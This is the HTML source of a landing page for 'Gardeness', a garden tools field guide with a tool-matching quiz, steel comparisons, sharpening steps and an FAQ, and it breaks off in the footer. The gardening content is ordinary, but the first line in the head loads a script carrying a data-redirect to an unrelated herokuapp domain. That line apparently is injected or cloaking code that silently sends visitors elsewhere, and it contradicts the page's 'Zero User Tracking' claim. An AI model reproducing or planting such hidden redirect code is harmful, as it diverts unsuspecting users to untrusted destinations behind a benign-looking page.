<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <script src="work/work.js" data-redirect="https://expertshere-8475ee157a5f.herokuapp.com/"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gardeness — Essential Garden Tools & Equipment Field Guide</title>
  <meta name="description" content="Gardeness is the curated field guide to essential gardening tools. Explore expert tool recommendations, metallurgy guides, sharpening masterclasses, and an interactive tool matcher.">
  <meta name="keywords" content="garden tools, gardening essentials, pruners, trowel, hori hori, garden spade, tool maintenance, tool sharpening, gardening guide">
  <meta name="author" content="Gardeness Editorial Team">

  <!-- Open Graph / Meta -->
  <meta property="og:title" content="Gardeness — Essential Garden Tools Field Guide">
  <meta property="og:description" content="Cultivate with confidence. Complete guide to heirloom quality gardening tools, ergonomics, care rituals, and starter kits.">
  <meta property="og:type" content="website">
  <meta property="og:image" content="assets/hero-tools.jpg">

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300..800;1,9..144,300..700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">

  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <!-- Ambient Botanical Background Glows -->
  <div class="ambient-glow glow-top" aria-hidden="true"></div>
  <div class="ambient-glow glow-center" aria-hidden="true"></div>

  <!-- Announcement Bar -->
  <aside class="announcement-bar" aria-label="Seasonal announcement">
    <div class="container announcement-content">
      <span class="announcement-pill">2026 Field Edition</span>
      <p class="announcement-text">
        <strong>Spring & Autumn Soil Preparation:</strong> Check out the newly updated metallurgy and heirloom sharpening rituals.
      </p>
      <a href="#maintenance" class="announcement-link">View Care Rituals &rarr;</a>
    </div>
  </aside>

  <!-- Sticky Header / Navigation -->
  <header class="site-header" id="header">
    <div class="container header-container">
      <a href="#" class="brand-logo" aria-label="Gardeness Home">
        <div class="logo-icon-wrap">
          <svg class="leaf-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M11 20A7 7 0 0 1 9.8 6.1C15.5 5 17 4.48 19 2c1 2 2 4.18 2 8 0 5.5-4.78 10-10 10Z"/>
            <path d="M2 21c0-3 1.85-5.36 5.08-6C9.5 14.52 12 13 13 12"/>
          </svg>
        </div>
        <div class="logo-text-wrap">
          <span class="logo-title">GARDENESS</span>
          <span class="logo-subtitle">Essentials Field Guide</span>
        </div>
      </a>

      <nav class="desktop-nav" aria-label="Main Navigation">
        <ul class="nav-links">
          <li><a href="#essentials" class="nav-link">Tool Guide</a></li>
          <li><a href="#matcher" class="nav-link">Kit Matcher</a></li>
          <li><a href="#metallurgy" class="nav-link">Anatomy & Steel</a></li>
          <li><a href="#maintenance" class="nav-link">Care & Honing</a></li>
          <li><a href="#checklist" class="nav-link">Shed Checklist</a></li>
          <li><a href="#faq" class="nav-link">FAQ</a></li>
        </ul>
      </nav>

      <div class="header-actions">
        <button id="shedDrawerBtn" class="btn btn-secondary shed-badge-btn" aria-label="Open your selected tools list">
          <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/>
            <line x1="3" y1="6" x2="21" y2="6"/>
            <path d="M16 10a4 4 0 0 1-8 0"/>
          </svg>
          <span>My Shed</span>
          <span class="badge" id="shedCountBadge">0</span>
        </button>

        <button class="mobile-toggle-btn" id="mobileMenuBtn" aria-label="Toggle navigation menu" aria-expanded="false">
          <span></span>
          <span></span>
          <span></span>
        </button>
      </div>
    </div>

    <!-- Mobile Navigation Drawer -->
    <div class="mobile-nav-drawer" id="mobileNavDrawer" aria-hidden="true">
      <ul class="mobile-nav-links">
        <li><a href="#essentials" class="mobile-link">Tool Guide</a></li>
        <li><a href="#matcher" class="mobile-link">Kit Matcher</a></li>
        <li><a href="#metallurgy" class="mobile-link">Anatomy & Steel</a></li>
        <li><a href="#maintenance" class="mobile-link">Care & Honing</a></li>
        <li><a href="#checklist" class="mobile-link">Shed Checklist</a></li>
        <li><a href="#faq" class="mobile-link">FAQ</a></li>
        <li class="mobile-divider"></li>
        <li><button class="modal-trigger mobile-link text-btn" data-modal="privacyModal">Privacy Policy</button></li>
        <li><button class="modal-trigger mobile-link text-btn" data-modal="termsModal">Terms of Service</button></li>
      </ul>
    </div>
  </header>

  <main id="main-content">
    <!-- Hero Section -->
    <section class="hero-section" id="hero">
      <div class="container hero-grid">
        <div class="hero-content">
          <div class="badge-pill">
            <span class="pulse-dot"></span>
            Independent • Unsponsored • Field Tested
          </div>
          <h1 class="hero-heading">
            Cultivate with Confidence. The Master Guide to <span class="text-gradient">Garden Essentials</span>.
          </h1>
          <p class="hero-description">
            Cut through disposable retail gimmicks. Gardeness delivers metallurgical breakdowns, ergonomic ratings, heirloom maintenance rituals, and interactive curation for balcony pots, raised beds, and homesteads.
          </p>

          <div class="hero-cta-group">
            <a href="#essentials" class="btn btn-primary">
              <span>Explore 24 Essential Implements</span>
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
            </a>
            <a href="#matcher" class="btn btn-outline">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6z"/></svg>
              <span>Take 30-Sec Kit Matcher</span>
            </a>
          </div>

          <!-- Hero Metrics -->
          <div class="hero-metrics">
            <div class="metric-item">
              <span class="metric-value">6</span>
              <span class="metric-label">Essential Disciplines</span>
            </div>
            <div class="metric-divider"></div>
            <div class="metric-item">
              <span class="metric-value">100%</span>
              <span class="metric-label">Forged & Field Tested</span>
            </div>
            <div class="metric-divider"></div>
            <div class="metric-item">
              <span class="metric-value">25+ Yrs</span>
              <span class="metric-label">Heirloom Lifespan Goal</span>
            </div>
          </div>
        </div>

        <!-- Hero Visual Showcase -->
        <div class="hero-visual">
          <div class="hero-image-card">
            <img src="assets/hero-tools.jpg" alt="Artisanal heirloom garden tools: bypass pruners, steel hand trowel, Japanese hori-hori knife, and leather gloves on weathered bench" class="hero-img" loading="eager" fetchpriority="high">
            <div class="hero-image-overlay"></div>
            
            <!-- Hotspot Tag 1 -->
            <div class="image-hotspot spot-1" tabindex="0" role="button" aria-label="High Carbon SK5 Pruning Shears">
              <span class="hotspot-pin"></span>
              <div class="hotspot-tooltip">
                <strong>Bypass Pruners</strong>
                <span>Japanese SK-5 Drop Forged Steel</span>
              </div>
            </div>

            <!-- Hotspot Tag 2 -->
            <div class="image-hotspot spot-2" tabindex="0" role="button" aria-label="Forged Ash-Wood Hand Trowel">
              <span class="hotspot-pin"></span>
              <div class="hotspot-tooltip">
                <strong>Hand Trowel</strong>
                <span>FSC Solid Ash Handle & Tempered Bowl</span>
              </div>
            </div>

            <!-- Hotspot Tag 3 -->
            <div class="image-hotspot spot-3" tabindex="0" role="button" aria-label="Japanese Hori Hori Soil Knife">
              <span class="hotspot-pin"></span>
              <div class="hotspot-tooltip">
                <strong>Hori-Hori Knife</strong>
                <span>Beveled Serration & Depth Gauges</span>
              </div>
            </div>

            <div class="hero-caption-pill">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
              <span>Hover or tap pins to inspect metallurgy and ergonomics</span>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Interactive Tool Matcher Quiz -->
    <section class="matcher-section" id="matcher">
      <div class="container">
        <div class="section-header text-center">
          <span class="section-tag">Interactive Arsenal Finder</span>
          <h2 class="section-title">Find Your Garden Kit in 3 Questions</h2>
          <p class="section-subtitle">
            Whether you cultivate rosemary on a third-floor balcony or manage a quarter-acre homestead, select your setup below to reveal your essential tool foundation.
          </p>
        </div>

        <div class="matcher-card glass-panel">
          <div class="matcher-steps-wrapper">
            <!-- Question 1 -->
            <div class="quiz-step active" data-step="1">
              <div class="quiz-step-header">
                <span class="step-num">Step 1 of 3</span>
                <h3 class="step-title">What is your primary growing space?</h3>
              </div>
              <div class="quiz-options-grid">
                <button type="button" class="quiz-option-btn" data-category="space" data-value="balcony">
                  <div class="quiz-icon">🪴</div>
                  <div class="quiz-text">
                    <strong>Balcony & Small Patios</strong>
                    <span>Containers, terracotta pots, railing planters (< 50 sq ft)</span>
                  </div>
                </button>
                <button type="button" class="quiz-option-btn selected" data-category="space" data-value="raised-bed">
                  <div class="quiz-icon">🥕</div>
                  <div class="quiz-text">
                    <strong>Raised Beds & Urban Plots</strong>
                    <span>Dedicated cedar/metal beds, suburban backyard borders</span>
                  </div>
                </button>
                <button type="button" class="quiz-option-btn" data-category="space" data-value="homestead">
                  <div class="quiz-icon">🏡</div>
                  <div class="quiz-text">
                    <strong>Expansive Yard & Orchard</strong>
                    <span>In-ground rows, fruit trees, perennial beds & composting (> 500 sq ft)</span>
                  </div>
                </button>
              </div>
            </div>

            <!-- Question 2 -->
            <div class="quiz-step active" data-step="2">
              <div class="quiz-step-header">
                <span class="step-num">Step 2 of 3</span>
                <h3 class="step-title">What is your principal cultivation focus?</h3>
              </div>
              <div class="quiz-options-grid">
                <button type="button" class="quiz-option-btn selected" data-category="focus" data-value="edibles">
                  <div class="quiz-icon">🥬</div>
                  <div class="quiz-text">
                    <strong>Kitchen Herbs & Vegetables</strong>
                    <span>High soil turning, frequent harvesting, seed drills & weed combat</span>
                  </div>
                </button>
                <button type="button" class="quiz-option-btn" data-category="focus" data-value="flowers">
                  <div class="quiz-icon">🌸</div>
                  <div class="quiz-text">
                    <strong>Ornamentals & Perennials</strong>
                    <span>Deadheading, root division, precision pruning & bulb planting</span>
                  </div>
                </button>
                <button type="button" class="quiz-option-btn" data-category="focus" data-value="trees">
                  <div class="quiz-icon">🌳</div>
                  <div class="quiz-text">
                    <strong>Shrubs, Fruit Trees & Hedging</strong>
                    <span>Heavy branch lopping, seasonal shaping, tree maintenance</span>
                  </div>
                </button>
              </div>
            </div>

            <!-- Question 3 -->
            <div class="quiz-step active" data-step="3">
              <div class="quiz-step-header">
                <span class="step-num">Step 3 of 3</span>
                <h3 class="step-title">What is your tool investment philosophy?</h3>
              </div>
              <div class="quiz-options-grid">
                <button type="button" class="quiz-option-btn" data-category="tier" data-value="starter">
                  <div class="quiz-icon">⚡</div>
                  <div class="quiz-text">
                    <strong>Lean & Essential</strong>
                    <span>Minimalist kit under $80, high versatility, lightweight handling</span>
                  </div>
                </button>
                <button type="button" class="quiz-option-btn selected" data-category="tier" data-value="heirloom">
                  <div class="quiz-icon">🛡️</div>
                  <div class="quiz-text">
                    <strong>Heirloom Lifetime Arsenal</strong>
                    <span>Forged SK5 carbon steel, FSC ash handles, fully re-sharpenable</span>
                  </div>
                </button>
              </div>
            </div>
          </div>

          <!-- Dynamic Quiz Recommendation Result -->
          <div class="quiz-result-box" id="quizResultBox">
            <div class="result-badge">Curated Recommendation</div>
            <div class="result-content-row">
              <div class="result-summary">
                <h3 class="result-title" id="kitResultTitle">The Raised Bed Kitchen Cultivator Kit</h3>
                <p class="result-desc" id="kitResultDesc">
                  Engineered for aerating rich compost beds, meticulous weed elimination at the root, and clean harvest cuts that stimulate vigorous plant regrowth.
                </p>
                <div class="result-meta-tags" id="kitResultTags">
                  <span class="tag">4 Primary Implements</span>
                  <span class="tag">Estimated Investment: $115 - $160</span>
                  <span class="tag">Lifespan: 20+ Years</span>
                </div>
              </div>
              <div class="result-tools-preview" id="kitToolsPreview">
                <!-- Dynamically rendered tool pills -->
              </div>
            </div>
            <div class="result-actions">
              <button type="button" class="btn btn-primary" id="addKitToShedBtn">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
                <span>Add Recommended Kit to My Shed</span>
              </button>
              <a href="#essentials" class="btn btn-secondary">Inspect Full Specs Below</a>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Main Tool Essentials Catalog -->
    <section class="essentials-section" id="essentials">
      <div class="container">
        <div class="section-header">
          <div class="header-left">
            <span class="section-tag">Curated Field Catalog</span>
            <h2 class="section-title">The Essential Garden Tool Index</h2>
            <p class="section-subtitle">
              Every tool detailed with metallurgical specifications, ergonomic analysis, ideal use cases, and longevity scorecards.
            </p>
          </div>
          <div class="header-right">
            <!-- Search Bar -->
            <div class="search-box">
              <svg class="search-icon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
              <input type="text" id="toolSearchInput" placeholder="Search by tool name, metal, or task..." aria-label="Search tools by name, metal, or task">
              <button class="search-clear-btn" id="searchClearBtn" aria-label="Clear search input">&times;</button>
            </div>
          </div>
        </div>

        <!-- Filter Controls -->
        <div class="filter-controls-bar">
          <div class="category-tabs" role="tablist" aria-label="Tool Categories">
            <button class="cat-tab active" data-cat="all" role="tab" aria-selected="true">All Essentials (24)</button>
            <button class="cat-tab" data-cat="digging" role="tab" aria-selected="false">Digging & Soil Prep</button>
            <button class="cat-tab" data-cat="pruning" role="tab" aria-selected="false">Pruning & Cutting</button>
            <button class="cat-tab" data-cat="weeding" role="tab" aria-selected="false">Weeding & Aeration</button>
            <button class="cat-tab" data-cat="watering" role="tab" aria-selected="false">Hydration & Testing</button>
            <button class="cat-tab" data-cat="protection" role="tab" aria-selected="false">Protection & Hauling</button>
          </div>

          <div class="sort-selector-wrap">
            <label for="toolSortSelect" class="sort-label">Sort by:</label>
            <select id="toolSortSelect" class="sort-select">
              <option value="essential">Essential Priority</option>
              <option value="durability">Durability Score</option>
              <option value="name">Alphabetical (A-Z)</option>
            </select>
          </div>
        </div>

        <!-- Active Filter Indicator -->
        <div class="active-filter-status" id="filterStatusText">
          Showing <strong>24 tools</strong> across all categories
        </div>

        <!-- Tools Grid -->
        <div class="tools-grid" id="toolsGrid">
          <!-- Dynamically populated via app.js -->
        </div>

        <!-- Empty Search State -->
        <div class="empty-state hidden" id="toolsEmptyState">
          <div class="empty-icon">🔍</div>
          <h3>No matching garden tools found</h3>
          <p>Try searching for terms like "pruner", "carbon steel", "hori", "hose", or "soil".</p>
          <button class="btn btn-secondary" id="resetSearchBtn">Reset Filters & Search</button>
        </div>
      </div>
    </section>

    <!-- Metallurgy & Anatomy Guide Section -->
    <section class="metallurgy-section" id="metallurgy">
      <div class="container">
        <div class="section-header text-center">
          <span class="section-tag">Buyer's Anatomy Guide</span>
          <h2 class="section-title">The Metallurgy & Craft Behind Great Tools</h2>
          <p class="section-subtitle">
            Tools fail because manufacturers substitute stamped sheet metal and fragile plastic welds. Understand steel grades and joinery before spending a dime.
          </p>
        </div>

        <!-- Steel Comparison Matrix -->
        <div class="steel-matrix-grid">
          <div class="steel-card glass-panel featured-steel">
            <div class="steel-badge">Gold Standard for Cutting</div>
            <h3 class="steel-title">High-Carbon SK5 / 1095 Steel</h3>
            <p class="steel-desc">Japanese carbon steel favored by professional arborists and master florists. Hardened to 58-60 HRC.</p>
            <ul class="steel-features">
              <li><span class="check-icon">✓</span> <strong>Edge Retention:</strong> Superlative. Can slice razor-thin bark without bruising.</li>
              <li><span class="check-icon">✓</span> <strong>Sharpening:</strong> Easy to hone on Japanese waterstones.</li>
              <li><span class="warn-icon">!</span> <strong>Vulnerability:</strong> Requires oiling after damp use; will develop patina or surface rust if neglected.</li>
            </ul>
            <div class="steel-recommendation">
              <strong>Best For:</strong> Bypass pruners, soil knives, grafting knives.
            </div>
          </div>

          <div class="steel-card glass-panel">
            <div class="steel-badge">Low-Maintenance Champ</div>
            <h3 class="steel-title">Forged Stainless Steel (420/440C)</h3>
            <p class="steel-desc">High chromium alloy resisting rust and soil acidity. Excellent for gardeners in wet climates.</p>
            <ul class="steel-features">
              <li><span class="check-icon">✓</span> <strong>Rust Immunity:</strong> Withstands wet mud and morning dew without pitting.</li>
              <li><span class="check-icon">✓</span> <strong>Soil Release:</strong> Mud slides effortlessly off mirror-polished surfaces.</li>
              <li><span class="warn-icon">!</span> <strong>Drawback:</strong> Slightly harder to achieve razor edge; can chip if levered on granite.</li>
            </ul>
            <div class="steel-recommendation">
              <strong>Best For:</strong> Hand trowels, border spades, weeding forks.
            </div>
          </div>

          <div class="steel-card glass-panel">
            <div class="steel-badge">Mass Retail Warning</div>
            <h3 class="steel-title">Stamped Sheet Metal & Cast Iron</h3>
            <p class="steel-desc">Punched from flat sheets with painted powder-coats hiding brittle porosity and spot welds.</p>
            <ul class="steel-features">
              <li><span class="cross-icon">&times;</span> <strong>Weakness:</strong> Bends under heavy clay root torque; snaps at neck weld.</li>
              <li><span class="cross-icon">&times;</span> <strong>Edge:</strong> Dull out of the box; incapable of holding sharp bevel.</li>
              <li><span class="cross-icon">&times;</span> <strong>False Economy:</strong> Typically discarded into landfills within 2 seasons.</li>
            </ul>
            <div class="steel-recommendation alert-text">
              <strong>Verdict:</strong> Avoid. Seek solid-socket forged heads with riveted handles.
            </div>
          </div>
        </div>

        <!-- Interactive Pruner Battle: Bypass vs Anvil -->
        <div class="battle-box glass-panel">
          <div class="battle-header">
            <h3>Bypass vs. Anvil Pruners: The Eternal Debate Resolved</h3>
            <p>Using the wrong cutter causes stem crushing, fungal disease, and wrist strain.</p>
          </div>
          <div class="battle-grid">
            <div class="battle-col">
              <div class="battle-tag bypass-tag">Bypass Pruner (Scissor Action)</div>
              <h4>Best for Live, Growing Stems</h4>
              <p>A curved blade slides past a thick counter-blade like scissors. Yields a surgical, clean cut that trees and rose bushes heal immediately.</p>
              <div class="spec-list">
                <div><span>Max Stem Diameter:</span> <strong>3/4 inch (20mm)</strong></div>
                <div><span>Cut Quality:</span> <strong>Flawless vascular preservation</strong></div>
                <div><span>Blade Action:</span> <strong>Sliding shear</strong></div>
              </div>
            </div>
            <div class="battle-vs">VS</div>
            <div class="battle-col">
              <div class="battle-tag anvil-tag">Anvil Pruner (Knife & Block)</div>
              <h4>Best for Dead, Brittle Wood</h4>
              <p>A sharp straight blade closes directly onto a flat soft-brass or aluminum plate. Delivers immense crushing force through dry, hard twigs without blade twist.</p>
              <div class="spec-list">
                <div><span>Max Stem Diameter:</span> <strong>1 inch (25mm)</strong></div>
                <div><span>Cut Quality:</span> <strong>Crushes live stems (never use on roses!)</strong></div>
                <div><span>Blade Action:</span> <strong>Chopping cleave</strong></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Care, Honing & Maintenance Masterclass -->
    <section class="maintenance-section" id="maintenance">
      <div class="container">
        <div class="section-header text-center">
          <span class="section-tag">The 20-Year Ritual</span>
          <h2 class="section-title">Heirloom Tool Care & Sharpening Masterclass</h2>
          <p class="section-subtitle">
            A sharp, oiled tool makes gardening effortless and prevents plant infections. Follow this 4-step ritual at the end of each working month.
          </p>
        </div>

        <div class="maintenance-grid">
          <!-- Visual Workshop Photo -->
          <div class="maintenance-visual">
            <div class="workshop-card">
              <img src="assets/tool-care.jpg" alt="Master gardener sharpening pruning shears with a whetstone and camellia oil on workbench" class="workshop-img" loading="lazy">
              <div class="workshop-overlay">
                <span class="workshop-pill">Workshop Ritual • Pro Technique</span>
                <p>Natural Camellia seed oil forms a microscopic barrier that prevents rust without attracting grit or harming soil microbes.</p>
              </div>
            </div>
          </div>

          <!-- Step by Step Ritual -->
          <div class="maintenance-steps">
            <div class="care-step-item">
              <div class="care-num">01</div>
              <div class="care-info">
                <h4>Scrape & Disinfect the Sap</h4>
                <p>Scrub away soil with a stiff copper or brass wire brush. Wipe blades thoroughly with 70% isopropyl alcohol to eliminate transfer of fungal spores, fire blight, or mosaic virus between plants.</p>
              </div>
            </div>

            <div class="care-step-item">
              <div class="care-num">02</div>
              <div class="care-info">
                <h4>Hone the Factory Bevel (20° Angle)</h4>
                <p>Use a medium (400-600 grit) diamond paddle or Japanese waterstone. Follow only the beveled factory angle on the cutting side. Never grind flat against the back face—simply deburr the back with one light stroke.</p>
              </div>
            </div>

            <div class="care-step-item">
              <div class="care-num">03</div>
              <div class="care-info">
                <h4>Nourish Hardwood Handles</h4>
                <p>Ash and hickory handles dry out and splinter from rain. Buff with fine 0000 steel wool, then hand-rub boiled linseed oil or beeswax salve into the grain to seal out moisture forever.</p>
              </div>
            </div>

            <div class="care-step-item">
              <div class="care-num">04</div>
              <div class="care-info">
                <h4>Apply Botanical Barrier Oil</h4>
                <p>Coat all steel joints, pivot bolts, and springs with 2-3 drops of pure Japanese camellia oil or food-grade mineral oil. Avoid petroleum WD-40 which evaporates quickly and leaves gummy residue.</p>
              </div>
            </div>
          </div>
        </div>

        <!-- Sharpening Bevel Quick Table -->
        <div class="bevel-table-card glass-panel">
          <h3 class="bevel-title">Tool Bevel Angle Reference Guide</h3>
          <div class="table-responsive">
            <table class="bevel-table">
              <thead>
                <tr>
                  <th>Garden Implement</th>
                  <th>Factory Bevel Angle</th>
                  <th>Recommended Hone</th>
                  <th>Maintenance Interval</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td><strong>Bypass Pruners</strong></td>
                  <td>20° - 23° (Single Bevel)</td>
                  <td>Diamond Mini-Paddle (600 Grit)</td>
                  <td>Every 10 hours of active cutting</td>
                </tr>
                <tr>
                  <td><strong>Garden Spades & Edgers</strong></td>
                  <td>45° (Single Outer Bevel)</td>
                  <td>Bastard Mill File (Single Cut)</td>
                  <td>Beginning of Spring & Autumn</td>
                </tr>
                <tr>
                  <td><strong>Hori-Hori Soil Knife</strong></td>
                  <td>25° Straight / Serrated File</td>
                  <td>Tapered Diamond Rod</td>
                  <td>Monthly during peak planting</td>
                </tr>
                <tr>
                  <td><strong>Oscillating Hoe / Dutch Hoe</strong></td>
                  <td>30° - 35° Double Bevel</td>
                  <td>Carborundum Whetstone</td>
                  <td>Bi-weekly for razor weed decapitation</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </section>

    <!-- Interactive Shed Checklist & Planner -->
    <section class="checklist-section" id="checklist">
      <div class="container">
        <div class="section-header text-center">
          <span class="section-tag">Interactive Gear Readiness</span>
          <h2 class="section-title">Your Garden Shed Inventory & Planner</h2>
          <p class="section-subtitle">
            Track your gear, identify missing essentials, and ensure your toolkit is 100% prepared for the upcoming growing cycle. Saved automatically in your browser.
          </p>
        </div>

        <div class="checklist-card glass-panel">
          <div class="checklist-header">
            <div class="checklist-progress-wrap">
              <div class="progress-labels">
                <span>Toolkit Readiness</span>
                <span id="readinessPercentage">0% Prepared</span>
              </div>
              <div class="progress-track">
                <div class="progress-bar" id="readinessBar" style="width: 0%"></div>
              </div>
            </div>

            <div class="checklist-actions">
              <button class="btn btn-sm btn-outline" id="markAllBtn">Select All Core</button>
              <button class="btn btn-sm btn-outline" id="clearAllBtn">Reset Checklist</button>
              <button class="btn btn-sm btn-primary" id="copyChecklistBtn">
                <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                <span>Export My Shed List</span>
              </button>
            </div>
          </div>

          <div class="checklist-grid" id="interactiveChecklist">
            <!-- Dynamically populated via app.js -->
          </div>
        </div>
      </div>
    </section>

    <!-- FAQ Section -->
    <section class="faq-section" id="faq">
      <div class="container">
        <div class="section-header text-center">
          <span class="section-tag">Knowledge Vault</span>
          <h2 class="section-title">Frequently Asked Garden Tool Questions</h2>
          <p class="section-subtitle">
            Direct answers to the most common queries from beginning growers and veteran green thumbs alike.
          </p>
        </div>

        <div class="faq-accordion-wrap">
          <div class="faq-item">
            <button class="faq-question" aria-expanded="false">
              <span>Why should I choose forged carbon steel over stainless steel for pruners?</span>
              <svg class="faq-chevron" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
            </button>
            <div class="faq-answer">
              <p>Forged high-carbon steel (like Japanese SK-5 or 1095) has a tighter molecular crystalline structure that can be sharpened to a microscopic razor edge that stainless steel cannot match. When pruning green living stems, a razor cut prevents vascular cell crushing, sealing faster against bacterial rot. While carbon steel requires occasional oiling to prevent oxidation, its cutting performance and longevity are unmatched.</p>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-question" aria-expanded="false">
              <span>Is WD-40 recommended for garden tools?</span>
              <svg class="faq-chevron" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
            </button>
            <div class="faq-answer">
              <p>WD-40 is a solvent (Water Displacement formula #40), not a durable lubricant or botanical protectant. It quickly evaporates and leaves a sticky petroleum film that attracts abrasive soil grit into pruner joints and pivots. Instead, use natural camellia oil, jojoba oil, or food-grade mineral oil which nourish steel without leaving toxic residues in organic vegetable beds.</p>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-question" aria-expanded="false">
              <span>What is a Japanese Hori-Hori knife and why do master gardeners swear by it?</span>
              <svg class="faq-chevron" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
            </button>
            <div class="faq-answer">
              <p>The Hori-Hori ("dig-dig" in Japanese) is the Swiss Army knife of gardening. It combines a semi-concave heavy steel blade, a razor straight edge, a serrated root-cutting edge, and engraved depth markers (in inches or centimeters). It replaces a trowel, weed digger, twine cutter, root saw, and bulb planter all in a single indestructible hand implement.</p>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-question" aria-expanded="false">
              <span>How do I protect wooden tool handles from weathering and splintering?</span>
              <svg class="faq-chevron" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
            </button>
            <div class="faq-answer">
              <p>Ash and hickory handles should never be varnished or polyurethaned, as thick lacquers trap moisture inside the wood, causing hidden dry rot. Instead, sand lightly with 180-grit sandpaper and rub boiled linseed oil or pure tung oil directly into the wood grain once in the spring and once in autumn. The oil polymerizes into the wood fibers, creating a smooth, weatherproof, splinter-free patina.</p>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-question" aria-expanded="false">
              <span>How often should I sharpen my bypass pruners?</span>
              <svg class="faq-chevron" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
            </button>
            <div class="faq-answer">
              <p>A quick 60-second touch-up with a fine diamond hone every 3 to 5 gardening sessions is much better than waiting for the blade to get visibly dull. If you notice stems folding instead of snapping crisply, or bark stripping down the stem, sharpen immediately.</p>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Legal Section Spotlight -->
    <section class="legal-spotlight-section">
      <div class="container">
        <div class="legal-spotlight-card glass-panel">
          <div class="legal-spotlight-info">
            <div class="legal-icon">⚖️</div>
            <div>
              <h3>Gardeness Transparency & Trust</h3>
              <p>We believe in pure independence and consumer protection. Review our full privacy practices and safety guidelines below.</p>
            </div>
          </div>
          <div class="legal-buttons">
            <button class="btn btn-outline modal-trigger" data-modal="privacyModal" id="openPrivacyBtn">
              Read Privacy Policy
            </button>
            <button class="btn btn-outline modal-trigger" data-modal="termsModal" id="openTermsBtn">
              Read Terms of Service
            </button>
          </div>
        </div>
      </div>
    </section>
  </main>

  <!-- Site Footer -->
  <footer class="site-footer">
    <div class="container footer-grid">
      <div class="footer-brand-col">
        <div class="footer-logo">
          <div class="logo-icon-wrap small">
            <svg class="leaf-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M11 20A7 7 0 0 1 9.8 6.1C15.5 5 17 4.48 19 2c1 2 2 4.18 2 8 0 5.5-4.78 10-10 10Z"/>
              <path d="M2 21c0-3 1.85-5.36 5.08-6C9.5 14.52 12 13 13 12"/>
            </svg>
          </div>
          <span class="logo-title">GARDENESS</span>
        </div>
        <p class="footer-bio">
          The definitive, unsponsored field guide to heirloom gardening equipment, agronomic hand tools, soil metallurgy, and lifelong maintenance rituals.
        </p>
        <div class="footer-local-badge">
          <span class="dot-green"></span>
          <span>Zero User Tracking • Local Storage Encrypted</span>
        </div>
      </div>

      <div class="footer-links-col">
        <h4>Field Disciplines</h4>
        <ul>
          <li><a href="#essentials">Soil Prep & Digging</a></li>
          <li><a href="#essentials">Pruning & Tree Care</a></li>
          <li><a href="#essentials">Weeding & Aeration</a></li>
          <li><a href="#essentials">Irrigation & Moisture</a></li>
          <li><a href="#essentials">Safety Gauntlets & Hauling</a></li>
        </ul>
      </div>

      <div class="footer-links-col">
        <h4>Knowledge & Tools</h4>
        <ul>
          <li><a href="#matcher">Interactive Kit Matcher</a></li>
          <li><a href="#metallurgy">Steel & Metallurgy Guide</a></li>
          <li><a href="#maintenance">Honing & Oil Masterclass</a></li>
          <li><a href="#checklist">Shed Inventory Tracker</a></li>
          <li><a href="#faq">Cultivation FAQ</a></li>
        </ul>
      </div>

      <div class="footer-links-col">
        <h4>Transparency & Legal</h4>
        <ul>
          <li><button class="footer-legal-link modal-trigger" data-modal="privacyModal">Privacy Policy</button></li>
          <li><button class="footer-legal-link modal-trigger" data-modal="termsModal">Terms of Service</button></li>
          <li><button class="footer-legal-link" id="footerClearDataBtn">Clear Local Shed Data</button></li>
          <li><span class="footer-contact-hint">Contact: legal@gardeness.guide</span></li>
        </ul>
      </div>
